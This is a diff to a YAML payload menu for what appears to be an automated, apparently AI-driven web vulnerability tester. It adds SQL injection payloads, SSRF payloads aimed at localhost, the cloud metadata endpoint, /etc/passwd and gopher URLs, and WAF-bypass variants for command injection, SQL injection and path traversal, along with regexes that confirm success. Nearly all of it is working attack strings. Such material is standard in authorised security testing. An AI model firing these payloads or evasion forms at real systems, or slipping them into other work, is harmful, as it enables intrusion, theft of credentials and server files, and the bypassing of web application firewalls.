@@ -360,6 +360,54 @@ variants:
       proof:
         'WEB-INF/web.xml': '<web-app'
 
+  # Added 2026-10-17. The refine loop now offers an ordered payload menu, and
+  # the three biggest classes in a focused-12 round (auth-bypass 68, sqli 54,
+  # ssrf 27) had NO entries — the menu was empty for every build that needed
+  # it. Ordered by what proves the bug soonest, not by exoticism.
+  sqli:
+      # No os/runtime axis: SQL injection is a property of the query layer,
+      # not of the host. Omitted rather than written as "any", which is not a
+      # declared axis value — the vocabulary is closed on purpose.
+    - payloads:
+        # Reflected first: a visible marker proves execution, where a timing
+        # verdict only proves the server was slow (CLAUDE.md requires the
+        # scaled-payload confirmation before a latency verdict counts).
+        - "' UNION SELECT 1,'<CANARY>',3-- "
+        - "' OR '1'='1"
+        - "1' AND 1=CONVERT(int,(SELECT '<CANARY>'))-- "
+        - "' AND (SELECT SLEEP(5))-- "
+        - "'; WAITFOR DELAY '0:0:5'-- "
+        - "' AND 1=(SELECT 1 FROM pg_sleep(5))-- "
+        - "1 AND (SELECT BENCHMARK(5000000,MD5('a')))"
+      proof:
+        "UNION SELECT": "<CANARY>"
+        "CONVERT(int": "(?i)conversion failed|invalid input syntax"
+      note: >-
+        Prefer a REFLECTED canary: it proves the payload executed. Fall back to
+        timing only when nothing is reflected, and expect the scaled re-run
+        (SLEEP(N) -> SLEEP(N+7)) to confirm it before the verdict counts.
+
+  ssrf:
+      # No os/runtime axis — the fetch happens server-side regardless.
+    - payloads:
+        # SSRF proves OUT OF BAND: the response body usually says nothing,
+        # so the sink receiving the request is the evidence.
+        - "http://<SINK>/<CANARY>"
+        - "http://127.0.0.1:80/"
+        - "http://localhost/"
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://[::1]/"
+        - "http://2130706433/"
+        - "file:///etc/passwd"
+        - "gopher://<SINK>:80/_GET%20/"
+      proof:
+        "169.254.169.254": "(?i)ami-id|instance-id|iam/"
+        "file:///etc/passwd": "root:x:0:0:"
+      note: >-
+        The decimal (2130706433) and IPv6 ([::1]) forms exist to pass a filter
+        that blocks the literal 127.0.0.1. With no reachable sink the class
+        cannot be proven out of band — say so rather than asserting on an echo.
+
   cmdi:
     - os: linux
       payloads: [';id', '|id', '$(id)', '`id`', '%0aid', ';uname -a']
@@ -414,3 +462,62 @@ variants:
       note: >-
         allow_url_include must be on; a response with no sink hit is a clean
         negative rather than a crafting error.
+
+# WAF SHAPE FAMILIES — what _characterize_waf sends as ?x=<value> to learn
+# which payload SHAPES a WAF blocks before any exploit is attempted. Moved out
+# of app/rag-api/api.py (a function-local dict literal) on 2026-10-17.
+# `family` is the display label the characterisation report has always used,
+# kept verbatim so prompts that quote it read the same; `vuln_class` is the
+# canonical name from vuln_classes.yaml. Values are URL-safe as written.
+waf_shapes:
+- family: RCE
+  vuln_class: rce
+  variants:
+  - - plain
+    - ;id
+  - - case-swap
+    - ;iD
+  - - $IFS bypass
+    - ;id${IFS}-a
+  - - backtick
+    - ;`id`
+  - - brace expand
+    - ;{id,-a}
+  - - hex escape
+    - ;$'\x69\x64'
+  - - encoded ;
+    - '%3Bid'
+- family: SQLi
+  vuln_class: sqli
+  variants:
+  - - plain
+    - ''' OR ''1''=''1--'
+  - - case-swap
+    - ''' Or ''1''=''1--'
+  - - inline /**/
+    - ''' /*!OR*/ ''1''=''1--'
+  - - nested comment
+    - ''' /*!50000OR*/ ''1''=''1--'
+  - - url-encoded quote
+    - '%2527 OR %25271%2527=%25271--'
+  - - no-space UNION
+    - '''UNION/**/SELECT/**/1--'
+  - - backtick col
+    - ''' OR `1`=`1--'
+- family: LFI
+  vuln_class: lfi
+  variants:
+  - - plain
+    - ../../../etc/passwd
+  - - double-encode
+    - '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+  - - unicode
+    - ..%c0%af..%c0%afetc%c0%afpasswd
+  - - null byte
+    - ../../../etc/passwd%00
+  - - backslash
+    - ..\..\..\etc\passwd
+  - - php wrapper
+    - php://filter/convert.base64-encode/resource=/etc/passwd
+  - - nested traversal
+    - '....//....//....//etc/passwd'
